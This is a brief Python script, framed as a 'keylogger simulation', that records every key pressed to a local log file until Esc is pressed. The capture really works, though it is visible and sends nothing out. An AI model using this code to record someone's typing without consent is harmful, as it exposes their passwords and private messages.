import logging
import keyboard

def run_keylogger():
    print("Keylogger Simulation: Recording keystrokes...")
    logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                logging.info(f"{event.name} key pressed.")
            if event.name == 'esc':  # Stop the keylogger when 'esc' is pressed
                print("Keylogger simulation stopped.")
                break
    except KeyboardInterrupt:
        print("Keylogger simulation interrupted.")

